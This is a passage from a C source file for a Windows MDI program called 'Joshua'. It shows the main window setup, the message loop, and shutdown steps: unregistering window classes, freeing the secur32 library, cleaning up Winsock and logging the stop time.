                  1024, 740, NULL, build_menu(), hInst, NULL);
    if (!g_frame) return 1;

    ShowWindow(g_frame, nCmdShow);
    UpdateWindow(g_frame);

    while (GetMessage(&msg, NULL, 0, 0)) {
        if (!TranslateMDISysAccel(g_mdi, &msg)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    if (!hPrev) {
        UnregisterClass("JoshuaFrame",      hInst);
        UnregisterClass("JoshuaChild",      hInst);
        UnregisterClass("JoshuaDlg",        hInst);
        UnregisterClass("JoshuaInputBox",   hInst);
        UnregisterClass("JoshuaStartupCfg", hInst);
    }
    if (g_secur32) FreeLibrary(g_secur32);
    WSACleanup();
    if (g_logfile) {
        SYSTEMTIME st; GetLocalTime(&st);
        fprintf(g_logfile,
                "===== Joshua stopped %04d-%02d-%02d %02d:%02d:%02d =====\r\n",
                st.wYear, st.wMonth, st.wDay,
                st.wHour, st.wMinute, st.wSecond);
        fclose(g_logfile); g_logfile = NULL;
    }
    return (int)msg.wParam;
}
